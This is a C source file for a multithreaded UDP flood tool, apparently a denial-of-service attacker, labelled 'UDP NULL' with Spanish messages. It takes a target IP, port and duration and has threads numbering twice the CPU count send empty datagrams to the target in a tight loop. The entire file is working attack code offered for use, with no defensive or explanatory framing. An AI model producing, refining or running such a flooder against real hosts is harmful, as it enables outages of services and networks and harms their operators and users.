#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <pthread.h>

struct argsattack{
    char *ip;
    unsigned short port;
    time_t start;
    int duracion;
};

void *udpnull(void *arg){
    struct argsattack *args = (struct argsattack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
        perror("sock");
        return NULL;
    }
    
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(args->port);
    dst.sin_addr.s_addr = inet_addr(args->ip);
    
    connect(sock, (struct sockaddr*)&dst, sizeof(dst));
    
    while(time(NULL) - args->start < args->duracion){
        if(send(sock, NULL, 0, 0) < 0){
            perror("send");
            break;
        }
    }
}

int countcpu(void){
    int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu <= 0){
        fprintf(stderr, "\n[ UDP NULL ] Error de conteo de cpus");
        exit(1);
    }
    return cpu * 2; // Probar la *2
}

int main(int argc, char *argv[]){
    if(argc != 4){
        fprintf(stderr, "uso: ./%s <ip> <port> <time>", argv[0]);
        return 1;
    }
    struct argsattack args;
    args.ip = argv[1];
    args.port = atoi(argv[2]);
    args.duracion = atoi(argv[3]);
    time_t inicio = time(NULL);
    args.start = inicio;
    
    int tam = countcpu();
    
    pthread_t *thr = calloc(tam, sizeof(pthread_t));
    if(!thr){
        fprintf(stderr, "\n[ UDP NULL ] Error de asignacion de memoria.\n");
        free(thr);
        exit(1);
    }
    
    for(int i = 0; i < tam; i++){
        if(pthread_create(&thr[i], NULL, udpnull, &args) != 0){
            fprintf(stderr, "\n[ UDP NULL ] Error de inicializacion de hilos\n");
            free(thr);
            exit(1);
        }
    }
    
    printf("[ UDP NULL ] Send ip: %s port: %hd time: %d", args.ip, args.port, args.duracion);
    fflush(stdout);
    
    for(int i = 0; i < tam; i++){
        pthread_join(thr[i], NULL);
    }
    
    free(thr);
    return 0;
}
